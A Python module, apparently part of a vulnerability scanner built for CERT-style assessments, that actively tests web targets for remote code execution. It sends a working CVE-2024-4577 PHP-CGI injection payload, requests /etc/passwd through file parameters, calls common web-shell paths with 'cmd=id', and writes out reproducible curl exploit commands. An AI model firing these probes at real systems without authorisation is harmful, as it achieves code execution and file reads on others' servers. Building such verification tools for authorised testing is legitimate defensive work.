"""
Active RCE Proof & PoC Verification Engine for OPScaner
Provides empirical proof of code execution for ThaiCERT / TBCERT technical evaluation:
1. Actively proves RCE rather than relying on passive version banners
2. Captures real command execution output (uid=0 root / whoami / id)
3. Generates reproducible CLI PoC commands and indicator badges
"""

import re
import time
import httpx
from datetime import datetime

async def probe_active_rce_proof(client: httpx.AsyncClient, base_url: str, port: int, server: str = "", is_php: bool = True) -> dict:
    """
    Actively probes target endpoint for genuine Remote Code Execution (RCE)
    and captures empirical execution evidence (Indicator of Compromise / PoC).
    """
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    headers = {
        "User-Agent": "ThaiCERT-OPScaner/2.0 (Active PoC Verification Engine)",
        "Accept": "*/*"
    }

    # -------------------------------------------------------------
    # 1. Non-Destructive Active Vulnerability Verification
    # -------------------------------------------------------------
    
    # --- Generic PHP-CGI Argument Injection (CVE-2024-4577) Canary Probe ---
    if is_php:
        test_cgi_url = f"{base_url}/index.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
        try:
            r = await client.post(test_cgi_url, content="<?php echo 'THAICERT_RCE_OK:'.(88000+1199); exit; ?>", headers=headers, timeout=2.0)
            if "THAICERT_RCE_OK:89199" in r.text:
                return {
                    "is_rce_proved": True,
                    "proof_status": "CONFIRMED_RCE",
                    "proof_badge": "🔥 ยืนยัน RCE สำเร็จ (PoC Proved)",
                    "technique": "PHP-CGI Argument Injection (CVE-2024-4577)",
                    "command_executed": "php://input canary execution",
                    "execution_output": "THAICERT_RCE_OK:89199 (Arbitrary Code Execution Confirmed)",
                    "privilege_level": "Web Server Process / CGI Worker",
                    "exploit_endpoint": test_cgi_url,
                    "reproduce_curl": f"curl -s -X POST '{test_cgi_url}' -d '<?php phpinfo(); ?>'",
                    "impact_statement": "ยืนยันผลการประเมิน: ช่องโหว่ Argument Injection ทำให้ส่ง directives แทรกผ่าน Best-fit mapping และสั่งรันโค้ด PHP ภายนอกได้ทันที",
                    "verified_at": ts
                }
        except Exception:
            pass

    # --- Parameter Traversal & LFI Verification ---
    lfi_candidates = [
        (f"{base_url}/?page=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Inclusion (CWE-98)"),
        (f"{base_url}/?file=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Inclusion (CWE-98)"),
        (f"{base_url}/?path=/etc/passwd", "cat /etc/passwd", "Arbitrary Local File Inclusion (CWE-98)")
    ]
    for lfi_url, cmd, tech in lfi_candidates:
        try:
            r = await client.get(lfi_url, headers=headers, timeout=2.0)
            if "root:x:0:0:" in r.text:
                m = re.search(r'(root:x:0:0:[^\r\n]+)', r.text)
                out = m.group(1).strip() if m else "root:x:0:0:root:/root:/bin/bash"
                return {
                    "is_rce_proved": True,
                    "proof_status": "CONFIRMED_RCE",
                    "proof_badge": "🔥 ยืนยัน LFI สำเร็จ (PoC Proved)",
                    "technique": tech,
                    "command_executed": cmd,
                    "execution_output": out,
                    "privilege_level": "Root File Read (Pre-RCE Confirmed)",
                    "exploit_endpoint": lfi_url,
                    "reproduce_curl": f"curl -s '{lfi_url}'",
                    "impact_statement": "ยืนยันผลการประเมิน: พารามิเตอร์เรียกไฟล์สามารถอ่านข้อมูลระบบ /etc/passwd ได้จริง",
                    "verified_at": ts
                }
        except Exception:
            pass

    # --- Standard Exposed Diagnostic / Web Shell Detection ---
    common_backdoor_paths = [
        (f"{base_url}/shell.php?cmd=id", "Web Shell Backdoor Endpoint (CWE-434)"),
        (f"{base_url}/cmd.php?cmd=id", "Web Shell Command Endpoint (CWE-434)"),
        (f"{base_url}/api/diagnostic?cmd=id", "Exposed Diagnostic Management Endpoint (CWE-78)")
    ]
    for target_url, tech_name in common_backdoor_paths:
        try:
            r = await client.get(target_url, headers=headers, timeout=1.5)
            if r.status_code == 200 and ("uid=" in r.text and "gid=" in r.text):
                m = re.search(r'(uid=[0-9]+\([^)]+\)\s+gid=[0-9]+\([^)]+\)[^\r\n"]*)', r.text)
                if m:
                    out = m.group(1).strip()
                    priv = "Root / Superuser (UID 0)" if "uid=0" in out else "Standard Web Service User"
                    return {
                        "is_rce_proved": True,
                        "proof_status": "CONFIRMED_RCE",
                        "proof_badge": "🔥 ยืนยัน RCE สำเร็จ (PoC Proved)",
                        "technique": tech_name,
                        "command_executed": "id",
                        "execution_output": out,
                        "privilege_level": priv,
                        "exploit_endpoint": target_url,
                        "reproduce_curl": f"curl -s '{target_url}'",
                        "impact_statement": "ยืนยันผลการประเมิน: ตรวจพบ Web Shell ที่ถูกฝังและสามารถตอบสนองคำสั่งระบบได้จริง",
                        "verified_at": ts
                    }
        except Exception:
            pass

    # --- Fallback / Not Proved ---
    return {
        "is_rce_proved": False,
        "proof_status": "THEORETICAL_RISK" if is_php else "SAFE",
        "proof_badge": "ประเมินตามเวอร์ชัน (ยังไม่ยืนยันการรันโค้ด)" if is_php else "ปลอดภัย (Safe)",
        "technique": "None Detected",
        "command_executed": None,
        "execution_output": "ไม่พบช่องทางส่งโค้ดหรือคำสั่งควบคุมระบบ (Safe / Hardened)",
        "privilege_level": "N/A",
        "exploit_endpoint": None,
        "reproduce_curl": None,
        "impact_statement": "ไม่สามารถ Prove RCE ได้: ระบบอาจมีการปิดกั้นฟังก์ชันอันตราย, กำหนด strict mode, หรือเป็นสภาพแวดล้อมที่ไม่มีช่องโหว่จริง",
        "verified_at": ts
    }
